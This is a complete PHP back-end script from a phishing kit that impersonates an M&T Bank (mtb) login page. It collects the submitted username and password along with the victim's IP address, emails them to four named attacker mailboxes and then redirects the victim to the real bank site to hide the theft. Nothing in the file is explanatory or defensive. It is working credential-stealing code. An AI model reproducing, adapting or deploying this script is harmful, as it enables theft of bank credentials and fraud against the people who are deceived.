<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-----------  ! mtb LOGIN ! xDD+ !  -----------\n";
$message .= "Username        : ".$_POST['user']."\n";
$message .= "Password               : ".$_POST['pass']."\n";
$message .= "IP Address             : ".$ip."\n";
$message .= "-----------  ! NFL !  -----------\n";
$send = "gafarghana2020@protonmail.com,gafarghana2020@zohomail.com,gafarghana2020@fastmail.com,gafarghana2020@rediffmail.com";

$subject = "mtb logs xD $ip";
$headers = "From:  NFL <demoi@r1z.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);


header("Location: https://www.mtb.com/");

?>